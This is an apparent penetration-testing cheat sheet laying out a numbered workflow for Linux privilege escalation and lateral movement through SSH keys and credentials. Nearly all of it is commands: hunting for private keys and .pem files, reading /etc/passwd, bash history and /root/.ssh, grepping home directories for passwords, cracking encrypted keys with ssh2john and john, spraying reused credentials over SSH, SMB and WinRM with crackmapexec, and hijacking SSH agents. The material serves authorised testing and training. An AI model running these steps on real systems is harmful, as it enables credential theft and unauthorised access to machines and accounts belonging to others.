# Linux Privilege Escalation – SSH Keys & Credentials

## Purpose

This file provides a structured workflow for discovering and exploiting SSH keys and credentials for privilege escalation and lateral movement.

Core rules:

* Credentials are often reused
* SSH keys frequently grant direct access
* One credential can unlock multiple systems
* Always test everything everywhere

---

## 0. Quick Credential Check (FIRST STEP)

```bash id="y1p2x3"
cat /etc/passwd
```

Look for:

* valid users
* login shells

---

## 1. Search for SSH Keys (CRITICAL)

```bash id="v3k8m1"
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
```

---

## 2. Check .ssh Directories

```bash id="p7r4n2"
ls -la /home/*/.ssh/
ls -la ~/.ssh/
```

Look for:

* id_rsa
* authorized_keys
* known_hosts

---

## 3. Use Private Key

```bash id="k9f2c6"
ssh -i id_rsa user@<IP>
```

Fix permissions if needed:

```bash id="x2z5t8"
chmod 600 id_rsa
```

---

## 4. SSH Into Localhost (COMMON WIN)

```bash id="q8n3w4"
ssh -i id_rsa user@localhost
```

---

## 5. Check Authorized Keys

```bash id="b4y6k1"
cat ~/.ssh/authorized_keys
```

Look for:

* other users
* key reuse opportunities

---

## 6. Crack Encrypted Keys

```bash id="m5d9t3"
ssh2john id_rsa > hash.txt
john hash.txt
```

---

## 7. Extract Credentials from Files

```bash id="c7z2x1"
grep -Ri "pass" /home 2>/dev/null
```

---

## 8. Bash History (HIGH VALUE)

```bash id="f1p8r7"
cat ~/.bash_history
```

Look for:

* passwords
* SSH commands
* connections

---

## 9. Reuse Credentials Locally

```bash id="v6m3k9"
su user
```

---

## 10. Reuse Credentials Remotely

```bash id="g8r1p4"
ssh user@<IP>
```

---

## 11. Test Credentials Across Services

```bash id="n2c9x5"
crackmapexec smb <IP> -u user -p pass
crackmapexec winrm <IP> -u user -p pass
```

---

## 12. Look for Other Users

```bash id="y7p4x2"
ls /home
```

Try:

* switching users
* accessing their SSH keys

---

## 13. SSH Agent Abuse

Check:

```bash id="r5k1m8"
env | grep SSH
```

If agent present:
→ may reuse loaded keys

---

## 14. Root Key Access

Check:

```bash id="z3c8v7"
ls -la /root/.ssh
```

If accessible:
→ direct root login

---

## 15. Credential Patterns

Look for:

* reused passwords
* naming conventions
* weak passwords

---

## 16. Pivot Opportunities

Credentials can unlock:

* SSH access
* SMB access
* WinRM access
* database access

---

## 17. If Stuck

RESET:

* search for keys again
* check history files
* test all credentials
* check other users

---

## 18. Mental Model

* Credentials = keys to systems
* Keys = direct access
* Access = escalation

---

## 19. Golden Rules

* Always search for id_rsa
* Always check bash history
* Always test localhost SSH
* Always reuse credentials everywhere
